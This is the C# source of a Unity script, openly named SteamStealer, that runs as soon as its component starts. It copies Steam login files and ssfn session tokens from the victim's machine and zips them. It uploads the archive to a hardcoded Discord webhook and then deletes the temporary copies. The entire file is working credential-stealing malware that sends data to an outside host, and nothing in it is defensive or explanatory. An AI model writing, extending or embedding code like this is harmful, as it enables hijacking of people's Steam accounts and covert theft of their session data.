using System;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;
using UnityEngine;

public static class Settings
{
    public static bool CaptureGames { get; set; } = true; // Default value; change as needed
}

public class SteamStealer : MonoBehaviour
{
    private string tempPath = Path.GetTempPath(); // Temporary path to store files
    private string discordWebhookUrl = "https://discord.com/api/webhooks/1303804400514633838/nqNZTP-WeqPTMTniA6ImACpIB0_2LUfDUtHzObaJ-toaGv2kN4qI8timwImRGWJZW7fA"; // Your Discord webhook URL
    private bool steamStolen = false;

    private void Start()
    {
        StealSteam();
    }

    private async void StealSteam() // Keep async
    {
        if (Settings.CaptureGames) // Assuming there's a Settings class with a CaptureGames property
        {
            Debug.Log("Stealing Steam session");
            string saveToPath = Path.Combine(tempPath, "Games", "Steam");
            string[] steamPaths = GetSteamInstallPaths();
            bool multiple = steamPaths.Length > 1;

            foreach (string steamPath in steamPaths)
            {
                string steamConfigPath = Path.Combine(steamPath, "config");
                if (Directory.Exists(steamConfigPath))
                {
                    string loginFile = Path.Combine(steamConfigPath, "loginusers.vdf");
                    if (File.Exists(loginFile))
                    {
                        string contents = File.ReadAllText(loginFile);
                        if (contents.Contains("\"RememberPassword\"\t\t\"1\""))
                        {
                            try
                            {
                                string _saveToPath = saveToPath;
                                if (multiple)
                                {
                                    _saveToPath = Path.Combine(saveToPath, $"Profile {Array.IndexOf(steamPaths, steamPath) + 1}");
                                }
                                Directory.CreateDirectory(_saveToPath);
                                CopyDirectory(steamConfigPath, Path.Combine(_saveToPath, "config"));

                                // Copy session files (ssfn files)
                                foreach (string item in Directory.GetFiles(steamPath))
                                {
                                    if (Path.GetFileName(item).StartsWith("ssfn"))
                                    {
                                        File.Copy(item, Path.Combine(_saveToPath, Path.GetFileName(item)), true);
                                        steamStolen = true;
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.LogError($"Error copying Steam files: {ex.Message}");
                            }
                        }
                    }
                }
            }

            if (steamStolen && multiple)
            {
                string infoFilePath = Path.Combine(saveToPath, "Info.txt");
                File.WriteAllText(infoFilePath, "Multiple Steam installations are found, so the files for each of them are put in different Profiles");
                await SendFileToDiscord(infoFilePath); // Send the Info.txt file to Discord
            }

            // If you want to send the entire save directory as a ZIP file:
            string zipFilePath = Path.Combine(tempPath, "SteamFiles.zip");
            ZipFile.CreateFromDirectory(saveToPath, zipFilePath); // Compressing the saved files into a ZIP
            await SendFileToDiscord(zipFilePath); // Send the ZIP file to Discord

            // Clean up the temp files
            File.Delete(zipFilePath);
            Directory.Delete(saveToPath, true);
        }
    }

    private string[] GetSteamInstallPaths()
    {
        // You can add logic to find Steam installation paths, or return a default path
        return new string[]
        {
            @"C:\Program Files (x86)\Steam" // Default Steam installation path
        };
    }

    private void CopyDirectory(string sourceDir, string destDir)
    {
        if (!Directory.Exists(sourceDir))
        {
            Debug.LogWarning($"Source directory does not exist: {sourceDir}");
            return;
        }

        Directory.CreateDirectory(destDir);
        foreach (string file in Directory.GetFiles(sourceDir))
        {
            string destFile = Path.Combine(destDir, Path.GetFileName(file));
            File.Copy(file, destFile, true);
        }

        foreach (string dir in Directory.GetDirectories(sourceDir))
        {
            string destDirPath = Path.Combine(destDir, Path.GetFileName(dir));
            CopyDirectory(dir, destDirPath);
        }
    }

    private async Task SendFileToDiscord(string filePath)
    {
        using (var client = new HttpClient())
        {
            using (var content = new MultipartFormDataContent())
            {
                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));
                    var response = await client.PostAsync(discordWebhookUrl, content);
                    response.EnsureSuccessStatusCode();
                    Debug.Log("File sent successfully to Discord.");
                }
            }
        }
    }
}





